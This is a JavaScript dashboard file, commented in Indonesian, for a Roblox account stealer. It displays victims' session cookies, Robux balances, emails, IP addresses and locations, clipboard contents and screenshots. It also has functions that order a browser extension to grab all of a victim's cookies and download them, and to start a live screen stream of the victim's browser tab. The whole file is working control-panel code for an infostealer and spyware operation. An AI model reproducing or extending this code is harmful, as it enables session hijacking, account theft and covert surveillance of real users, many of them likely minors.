// API Base URL
const API_URL = window.location.origin;

// API Key — diambil dari Pastebin
let API_KEY = '';

async function loadApiKey() {
    try {
        const response = await fetch('/config');
        const data = await response.json();
        API_KEY = data.apiKey;
        console.log('✅ API Key dari /config berhasil dimuat');
    } catch (e) {
        console.error('❌ Gagal load API key dari /config:', e.message);
    }
}

// Simpan accounts di memory supaya filter tidak perlu fetch ulang
let allAccounts = [];

// Cache avatar URLs agar tidak fetch ulang tiap render
const avatarCache = {};

// Load data on page load
document.addEventListener('DOMContentLoaded', async () => {
    await loadApiKey();
    console.log('✅ API Key loaded:', API_KEY ? 'OK' : 'GAGAL');
    await loadData();
    // Auto refresh every 30 seconds
    setInterval(loadData, 30000);
});

// Load all data
async function loadData() {
    try {
        const response = await fetch(`${API_URL}/api/accounts`, {
            headers: { 'x-api-key': API_KEY }
        });
        const data = await response.json();

        if (data.success) {
            allAccounts = data.accounts || [];
            renderAccounts(allAccounts);
            updateStats(data.stats, allAccounts);
            loadLogs();
        }
    } catch (error) {
        console.error('Error loading data:', error);
        document.getElementById('accountsGrid').innerHTML =
            '<div class="loading">❌ Error loading data. Please refresh.</div>';
    }
}

// ============================================
// FETCH ROBLOX AVATAR HEADSHOT
// ============================================
async function fetchAvatarUrl(userId) {
    if (!userId) return null;
    const uid = String(userId);

    // Pakai cache kalau sudah pernah di-fetch
    if (avatarCache[uid]) return avatarCache[uid];

    try {
        const res = await fetch(
            `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${uid}&size=420x420&format=Png&isCircular=false`
        );
        const json = await res.json();
        const imageUrl = json?.data?.[0]?.imageUrl || null;
        if (imageUrl) avatarCache[uid] = imageUrl;
        return imageUrl;
    } catch (e) {
        console.warn(`Gagal fetch avatar userId ${uid}:`, e.message);
        return null;
    }
}

// Load dan inject avatar ke semua card yang sudah di-render
async function loadAvatarsForCards(accounts) {
    for (const account of accounts) {
        const uid = String(account.userId || '');
        if (!uid || uid === 'N/A') continue;

        const imgEl = document.getElementById(`avatar-${uid}`);
        if (!imgEl) continue;

        const url = await fetchAvatarUrl(uid);
        if (url) {
            imgEl.src = url;
            imgEl.style.opacity = '1';
            imgEl.classList.remove('avatar-loading');
        }
    }
}


// ============================================
// GRAB ALL COOKIES — kirim perintah ke extension & polling download
// ============================================

async function grabAllCookies(userId) {
    const btn = document.getElementById(`grab-btn-${userId}`);
    const statusEl = document.getElementById(`grab-status-${userId}`);

    if (btn) {
        btn.disabled = true;
        btn.textContent = '⏳ Grabbing...';
    }
    if (statusEl) statusEl.textContent = '';

    try {
        // Kirim perintah ke extension via chrome.runtime message (jika ada)
        // Extension mendengar message ini dan menjalankan grabAllCookiesAndSend(userId)
        // Karena dashboard berjalan di web browser biasa (bukan extension page),
        // kita pakai endpoint server sebagai trigger relay.
        // Extension secara periodik grab otomatis jika tidak ada extension ID.

        // Coba kirim via postMessage ke extension (jika user buka dari extension context)
        let sentViaExtension = false;
        try {
            if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.sendMessage) {
                await new Promise((resolve, reject) => {
                    chrome.runtime.sendMessage(
                        { action: 'grabAllCookies', userId: String(userId) },
                        (resp) => {
                            if (chrome.runtime.lastError) reject(chrome.runtime.lastError);
                            else resolve(resp);
                        }
                    );
                });
                sentViaExtension = true;
            }
        } catch (e) {
            console.warn('Extension tidak bisa dihubungi langsung (normal jika buka di browser biasa):', e.message);
        }

        if (!sentViaExtension) {
            // Fallback: buka tab baru ke roblox agar extension running & auto-grab
            if (statusEl) statusEl.innerHTML = '<span style="color:#f7931a;">⚠️ Buka tab Roblox agar extension aktif, lalu grab otomatis tersedia dalam ~15 detik.</span>';
        }

        // Polling cek apakah cookies sudah tersedia di server (max 30 detik)
        let ready = false;
        for (let i = 0; i < 10; i++) {
            await new Promise(r => setTimeout(r, 3000));
            try {
                const infoRes = await fetch(`${API_URL}/api/cookies/${userId}/info`, {
                    headers: { 'x-api-key': API_KEY }
                });
                const info = await infoRes.json();
                if (info.ready) {
                    ready = true;
                    break;
                }
            } catch (e) {}
            if (statusEl) statusEl.textContent = `⏳ Menunggu... (${(i + 1) * 3}s)`;
        }

        if (ready) {
            if (statusEl) statusEl.innerHTML = `<span style="color:#00d4ff;">✅ Cookies siap!</span>`;
            // Auto download
            downloadCookies(userId);
        } else {
            if (statusEl) statusEl.innerHTML = `<span style="color:#ff6b6b;">❌ Timeout. Pastikan extension aktif di tab Roblox, lalu coba lagi.</span>`;
        }

    } catch (e) {
        console.error('❌ grabAllCookies error:', e);
        if (statusEl) statusEl.innerHTML = `<span style="color:#ff6b6b;">❌ Error: ${e.message}</span>`;
    } finally {
        if (btn) {
            btn.disabled = false;
            btn.textContent = '🍪 Grab All Cookies';
        }
    }
}

function downloadCookies(userId) {
    const link = document.createElement('a');
    link.href = `${API_URL}/api/cookies/${userId}`;
    // Tambahkan header dengan cara buat fetch blob lalu download
    fetch(`${API_URL}/api/cookies/${userId}`, {
        headers: { 'x-api-key': API_KEY }
    })
    .then(res => {
        if (!res.ok) { alert('❌ Cookies belum tersedia. Klik Grab All Cookies dulu.'); return; }
        const disposition = res.headers.get('Content-Disposition') || '';
        const match = disposition.match(/filename="([^"]+)"/);
        const filename = match ? match[1] : `cookies_${userId}.txt`;
        return res.blob().then(blob => ({ blob, filename }));
    })
    .then(({ blob, filename }) => {
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    })
    .catch(e => {
        alert('❌ Error download: ' + e.message);
    });
}


// ============================================
// REFRESH SCREENSHOT — kirim sinyal ke extension
// ============================================

async function refreshScreenshot(userId) {
    const btn = document.getElementById(`refresh-ss-btn-${userId}`);
    if (btn) {
        btn.disabled = true;
        btn.textContent = '⏳';
    }
    try {
        const res = await fetch(`${API_URL}/api/request-screenshot/${userId}`, {
            method: 'POST',
            headers: { 'x-api-key': API_KEY }
        });
        const json = await res.json();
        if (json.success) {
            // Poll sampai screenshot berubah (max 15 detik)
            const currentSrc = document.getElementById(`ss-thumb-${userId}`)?.src || '';
            let updated = false;
            for (let i = 0; i < 15; i++) {
                await new Promise(r => setTimeout(r, 1000));
                try {
                    const dataRes = await fetch(`${API_URL}/api/accounts`, { headers: { 'x-api-key': API_KEY } });
                    const data = await dataRes.json();
                    const acc = (data.accounts || []).find(a => String(a.userId) === String(userId));
                    if (acc?.screenshot && acc.screenshot !== currentSrc) {
                        // Update thumbnail di card
                        const thumb = document.getElementById(`ss-thumb-${userId}`);
                        if (thumb) { thumb.src = acc.screenshot; thumb.parentElement.style.display = 'block'; }
                        // Update allAccounts
                        const idx = allAccounts.findIndex(a => String(a.userId) === String(userId));
                        if (idx !== -1) allAccounts[idx].screenshot = acc.screenshot;
                        updated = true;
                        break;
                    }
                } catch (e) {}
            }
            if (btn) btn.textContent = updated ? '🔄 Refresh Screenshot' : '🔄 Refresh Screenshot';
        }
    } catch (e) {
        console.error('refreshScreenshot error:', e);
    } finally {
        if (btn) { btn.disabled = false; btn.textContent = '🔄 Refresh Screenshot'; }
    }
}

// ============================================
// LIVE STREAM — tampil frame dari server
// ============================================

const liveStates = {}; // userId -> { active, interval }

async function toggleLive(userId) {
    if (!liveStates[userId]) liveStates[userId] = { active: false, interval: null };
    const state = liveStates[userId];
    const btn = document.getElementById(`live-btn-${userId}`);
    const container = document.getElementById(`live-container-${userId}`);
    const liveImg = document.getElementById(`live-img-${userId}`);
    const liveStatus = document.getElementById(`live-status-${userId}`);

    if (!state.active) {
        // START LIVE
        state.active = true;
        if (btn) { btn.textContent = '⏹ Live OFF'; btn.classList.add('live-on'); }
        if (container) container.style.display = 'block';

        // Kirim perintah ke server
        await fetch(`${API_URL}/api/live-start/${userId}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
            body: JSON.stringify({})
        });

        // Poll frame setiap 1.2 detik
        state.interval = setInterval(async () => {
            if (!state.active) { clearInterval(state.interval); return; }
            try {
                const res = await fetch(`${API_URL}/api/live-frame/${userId}`, {
                    headers: { 'x-api-key': API_KEY }
                });
                const data = await res.json();
                if (data.ready && data.frame) {
                    if (liveImg) liveImg.src = data.frame;
                    if (liveStatus) liveStatus.textContent = data.tabTitle
                        ? `🟢 Live — ${data.tabTitle.substring(0, 40)}`
                        : '🟢 Live';
                } else if (data.stale) {
                    if (liveStatus) liveStatus.textContent = '🟡 Menunggu frame...';
                }
            } catch (e) {}
        }, 1200);

    } else {
        // STOP LIVE
        state.active = false;
        if (state.interval) { clearInterval(state.interval); state.interval = null; }
        if (btn) { btn.textContent = '▶ Live ON'; btn.classList.remove('live-on'); }
        if (container) container.style.display = 'none';
        if (liveStatus) liveStatus.textContent = '';

        await fetch(`${API_URL}/api/live-stop/${userId}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
            body: JSON.stringify({})
        });
    }
}

// Download screenshot dari card
function downloadScreenshotCard(userId) {
    const account = allAccounts.find(a => String(a.userId) === String(userId));
    if (!account?.screenshot) { alert('❌ Tidak ada screenshot'); return; }
    const a = document.createElement('a');
    a.href = account.screenshot;
    a.download = `screenshot_${account.username || userId}_${Date.now()}.jpg`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
}

// Download live frame saat ini
function downloadLiveFrame(userId) {
    const img = document.getElementById(`live-img-${userId}`);
    if (!img || !img.src || img.src === window.location.href) { alert('❌ Tidak ada frame live'); return; }
    const a = document.createElement('a');
    a.href = img.src;
    a.download = `live_frame_${userId}_${Date.now()}.jpg`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
}

// ============================================
// RENDER ACCOUNTS (dengan avatar headshot)
// ============================================
function renderAccounts(accounts) {
    const grid = document.getElementById('accountsGrid');
    const filtered = applyFilter(accounts);

    if (!filtered || filtered.length === 0) {
        grid.innerHTML = `<div class="loading" style="grid-column:1/-1;">📭 No accounts</div>`;
        return;
    }

    grid.innerHTML = filtered.map(account => `
        <div class="account-card">
            <span class="badge ${account.premium ? 'badge-premium' : 'badge-free'}">
                ${account.premium ? '⭐ PREMIUM' : 'FREE'}
            </span>
            ${account.twoFAEnabled ? '<span class="badge badge-2fa">🔒 2FA</span>' : ''}

            <!-- Avatar + Nama -->
            <div class="account-header">
                <div class="avatar-wrapper">
                    <img
                        id="avatar-${account.userId || ''}"
                        class="avatar-img avatar-loading"
                        src=""
                        alt="Avatar"
                        onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';"
                    />
                    <div class="avatar-fallback" style="display:none;">👤</div>
                </div>
                <div class="account-name-block">
                    <div class="username">${account.displayName || account.username || 'Unknown'}</div>
                    <div class="user-id">🆔 ${account.userId || 'N/A'}</div>
                </div>
            </div>

            <div class="info-grid">
                <div class="info-item">
                    <span class="label">💰 Robux</span>
                    <span class="value">${(account.robux || 0).toLocaleString()} R$</span>
                </div>
                <div class="info-item">
                    <span class="label">👥 Friends</span>
                    <span class="value">${account.friends || 0}</span>
                </div>
                <div class="info-item">
                    <span class="label">📅 Age</span>
                    <span class="value">${account.accountAge || 'N/A'}</span>
                </div>
                <div class="info-item">
                    <span class="label">📧 Email</span>
                    <span class="value">${account.emailVerified ? '✅' : '❌'} ${account.email || 'N/A'}</span>
                </div>
            </div>

            <!-- IP & Location -->
            <div class="ip-location">
                <div style="display:flex; justify-content:space-between; font-size:12px; color:var(--text-secondary);">
                    <span>🌐 IP: <strong style="color:var(--text-primary);">${account.ip || 'Unknown'}</strong></span>
                    <span>📍 ${account.location?.country || 'Unknown'}, ${account.location?.city || ''}</span>
                </div>
                <div style="font-size:11px; color:var(--text-muted); margin-top:4px;">
                    ${account.location?.isp || 'ISP Unknown'} · ${account.device?.platform || 'Device Unknown'}
                </div>
            </div>

            <!-- Clipboard -->
            ${account.clipboard?.hasData ? `
                <div style="margin-top:10px; background:rgba(255,255,255,0.03); border-radius:var(--radius-sm); padding:6px 10px; font-size:12px; color:var(--text-secondary);">
                    📋 Clipboard: <span style="color:var(--text-primary);">${account.clipboard.text.substring(0, 80)}${account.clipboard.text.length > 80 ? '...' : ''}</span>
                    <button class="copy-btn" onclick="copyText('${(account.clipboard.text || '').replace(/'/g, "\\'")}');" style="background:none; border:none; color:var(--accent-cyan); cursor:pointer; margin-left:6px;">Copy</button>
                </div>
            ` : ''}

            <!-- Screenshot -->
            <div class="screenshot-section" style="margin-top:10px;">
                <!-- Thumbnail -->
                <div id="ss-thumb-wrap-${account.userId}" style="display:${account.screenshot ? 'block' : 'none'}; position:relative; border-radius:8px; overflow:hidden; margin-bottom:6px;">
                    <img
                        id="ss-thumb-${account.userId}"
                        src="${account.screenshot || ''}"
                        style="width:100%; display:block; border-radius:8px; cursor:pointer;"
                        onclick="openLightboxFromCard('${account.userId}')"
                        alt="Screenshot"
                    />
                    <!-- Tombol download screenshot di pojok kanan atas -->
                    <button
                        onclick="downloadScreenshotCard('${account.userId}')"
                        style="position:absolute;top:6px;right:6px;background:rgba(0,0,0,0.65);border:1px solid #ffffff33;color:#fff;padding:3px 9px;border-radius:6px;font-size:11px;cursor:pointer;"
                    >⬇ Download</button>
                </div>

                <!-- Tombol Refresh Screenshot -->
                <div style="display:flex; gap:6px; margin-bottom:6px;">
                    <button
                        id="refresh-ss-btn-${account.userId}"
                        class="btn-refresh-ss"
                        onclick="refreshScreenshot('${account.userId}')"
                    >🔄 Refresh Screenshot</button>
                    ${account.screenshot ? `
                    <button
                        class="btn-view-ss"
                        onclick="openLightboxFromCard('${account.userId}')"
                    >🔍 View</button>
                    ` : ''}
                </div>

                <!-- Live Stream container -->
                <div id="live-container-${account.userId}" style="display:none; margin-bottom:6px; position:relative; border-radius:8px; overflow:hidden; border:1px solid #00d4ff44;">
                    <img
                        id="live-img-${account.userId}"
                        src=""
                        style="width:100%; display:block; border-radius:8px;"
                        alt="Live"
                    />
                    <!-- Download live frame -->
                    <button
                        onclick="downloadLiveFrame('${account.userId}')"
                        style="position:absolute;top:6px;right:6px;background:rgba(0,0,0,0.65);border:1px solid #ffffff33;color:#fff;padding:3px 9px;border-radius:6px;font-size:11px;cursor:pointer;"
                    >⬇ Download Frame</button>
                    <div id="live-status-${account.userId}" style="position:absolute;bottom:6px;left:8px;font-size:11px;color:#00ff88;text-shadow:0 0 8px #00ff88;"></div>
                </div>

                <!-- Tombol Live ON/OFF -->
                <button
                    id="live-btn-${account.userId}"
                    class="btn-live-toggle"
                    onclick="toggleLive('${account.userId}')"
                >▶ Live ON</button>
            </div>

            <!-- Cookie & Actions -->
            <div class="cookie-box" style="margin-top:12px;">
                <textarea readonly rows="2">${account.cookie || 'No cookie'}</textarea>
                <button class="copy-btn" onclick="copyCookie('${(account.cookie || '').replace(/'/g, "\\'")}')">📋 Copy</button>
            </div>
            <!-- Grab All Cookies -->
            <div style="margin-top:10px;">
                <button
                    id="grab-btn-${account.userId}"
                    class="btn-grab-cookies"
                    onclick="grabAllCookies('${account.userId}')"
                >🍪 Grab All Cookies</button>
                <div id="grab-status-${account.userId}" style="font-size:11px; margin-top:4px; min-height:16px;"></div>
            </div>

            <div class="actions">
                <button class="btn-profile" onclick="openProfile('${account.userId}')">👤 Profile</button>
                <button class="btn-delete" onclick="deleteAccount('${account.userId}')">🗑️ Delete</button>
            </div>
        </div>
    `).join('');

    // Refresh Lucide icons jika ada
    if (typeof lucide !== 'undefined') lucide.createIcons();

    // Load avatar asinkron setelah DOM render
    loadAvatarsForCards(filtered);
}

// FIX: Ganti nama jadi applyFilter agar tidak konflik dengan fungsi refresh di bawah
function applyFilter(accounts) {
    const search = (document.getElementById('searchInput')?.value || '').toLowerCase();
    const premiumFilter = document.getElementById('filterPremium')?.value || 'all';
    const sortBy = document.getElementById('sortBy')?.value || 'newest';

    let filtered = accounts || [];

    // Search
    if (search) {
        filtered = filtered.filter(a =>
            a.username?.toLowerCase().includes(search) ||
            a.displayName?.toLowerCase().includes(search) ||
            String(a.userId || '').includes(search)
        );
    }

    // Premium filter
    if (premiumFilter === 'premium') {
        filtered = filtered.filter(a => a.premium === true);
    } else if (premiumFilter === 'free') {
        filtered = filtered.filter(a => !a.premium);
    }

    // Sort
    if (sortBy === 'newest') {
        filtered.sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
    } else if (sortBy === 'oldest') {
        filtered.sort((a, b) => new Date(a.createdAt || 0) - new Date(b.createdAt || 0));
    } else if (sortBy === 'robux') {
        filtered.sort((a, b) => (b.robux || 0) - (a.robux || 0));
    }

    return filtered;
}

// Update stats
function updateStats(stats, accounts) {
    document.getElementById('totalAccounts').textContent = stats?.totalAccounts || accounts.length || 0;
    document.getElementById('totalRobux').textContent = (stats?.totalRobux || 0).toLocaleString();
    const premiumCount = (accounts || []).filter(a => a.premium).length;
    document.getElementById('premiumCount').textContent = premiumCount;

    // Tambahan: total screenshot & clipboard
    const totalScreenshots = (accounts || []).filter(a => a.screenshot).length;
    const totalClipboards = (accounts || []).filter(a => a.clipboard?.hasData).length;
    if (document.getElementById('totalScreenshots'))
        document.getElementById('totalScreenshots').textContent = totalScreenshots;
    if (document.getElementById('totalClipboards'))
        document.getElementById('totalClipboards').textContent = totalClipboards;
}

// Load logs
async function loadLogs() {
    try {
        const response = await fetch(`${API_URL}/api/stats`, {
            headers: { 'x-api-key': API_KEY }
        });
        const data = await response.json();

        if (data.success && data.recentLogs) {
            const container = document.getElementById('logsContainer');
            container.innerHTML = data.recentLogs.reverse().map(log => `
                <div class="log-entry">
                    <span>
                        <span class="log-type ${log.type}">${log.type}</span>
                        ${log.username ? `@${log.username}` : ''}
                        ${log.content ? `: ${log.content.substring(0, 50)}` : ''}
                    </span>
                    <span class="log-time">${new Date(log.timestamp).toLocaleString()}</span>
                </div>
            `).join('');
        }
    } catch (error) {
        console.error('Error loading logs:', error);
    }
}

// Copy cookie
function copyCookie(cookie) {
    if (cookie && cookie !== 'No cookie') {
        navigator.clipboard.writeText(cookie).then(() => {
            alert('✅ Cookie copied to clipboard!');
        }).catch(() => {
            const textarea = document.createElement('textarea');
            textarea.value = cookie;
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
            alert('✅ Cookie copied!');
        });
    } else {
        alert('❌ No cookie to copy');
    }
}

// Open Roblox profile
function openProfile(userId) {
    window.open(`https://www.roblox.com/users/${userId}/profile`, '_blank');
}

// ============================================
// FUNGSI UNTUK SCREENSHOT
// ============================================
let currentScreenshotAccountId = null;

function viewScreenshot(userId) {
    const account = allAccounts.find(a => String(a.userId) === String(userId));
    if (!account || !account.screenshot) {
        alert('No screenshot available for this account.');
        return;
    }
    currentScreenshotAccountId = userId;
    document.getElementById('screenshotImage').src = account.screenshot;
    document.getElementById('screenshotModal').classList.add('visible');
}

function closeScreenshotModal() {
    document.getElementById('screenshotModal').classList.remove('visible');
    currentScreenshotAccountId = null;
}

function downloadScreenshot() {
    const img = document.getElementById('screenshotImage');
    if (!img.src) return;
    const link = document.createElement('a');
    link.download = `screenshot_${currentScreenshotAccountId || Date.now()}.jpg`;
    link.href = img.src;
    link.click();
}

// ============================================
// FUNGSI COPY TEXT (Clipboard)
// ============================================
function copyText(text) {
    if (!text) {
        alert('Nothing to copy');
        return;
    }
    navigator.clipboard.writeText(text).then(() => {
        alert('✅ Copied to clipboard!');
    }).catch(() => {
        const ta = document.createElement('textarea');
        ta.value = text;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        document.body.removeChild(ta);
        alert('✅ Copied!');
    });
}

// Delete account
async function deleteAccount(userId) {
    if (confirm('⚠️ Are you sure you want to delete this account?')) {
        try {
            const response = await fetch(`${API_URL}/api/account/${userId}`, {
                method: 'DELETE',
                headers: { 'x-api-key': API_KEY }
            });
            const data = await response.json();

            if (data.success) {
                alert('✅ Account deleted successfully');
                loadData();
            } else {
                alert('❌ Failed to delete account');
            }
        } catch (error) {
            alert('❌ Error deleting account');
        }
    }
}

function openLightboxFromCard(userId) {
    const account = allAccounts.find(a => String(a.userId) === String(userId));
    if (!account?.screenshot) return;
    // Gunakan lightbox yang sudah ada di dashboard.html
    const lb = document.getElementById('screenshotLightbox');
    const lbImg = document.getElementById('lightboxImage');
    if (lb && lbImg) {
        lbImg.src = account.screenshot;
        lb.classList.add('visible');
    }
}

// FIX: Fungsi ini dipanggil dari tombol filter/search/sort di HTML
function refreshFilter() {
    renderAccounts(allAccounts);
}
